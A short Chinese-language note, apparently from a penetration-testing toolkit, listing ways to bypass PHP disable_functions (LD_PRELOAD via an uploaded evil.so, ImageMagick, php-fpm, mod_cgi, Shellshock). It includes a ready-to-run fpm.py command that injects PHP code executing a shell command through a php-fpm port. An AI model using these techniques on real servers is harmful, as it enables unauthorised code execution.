除了bypass.php的方法外，还有imagemagic，php-fpm，mod_cgi，破壳可用

bypass.php当使用ld_preload方法时，需要上传evil.so文件后用so_path指定so文件位置

php-fpm方法可使用fpm.py利用，示例:python fpm.py 127.0.0.1 -p 9000 /var/www/html/phpinfo.php -c '<?php echo `id`;exit;?>'，脚本来源https://gist.github.com/phith0n/9615e2420f31048f7e30f3937356cf75
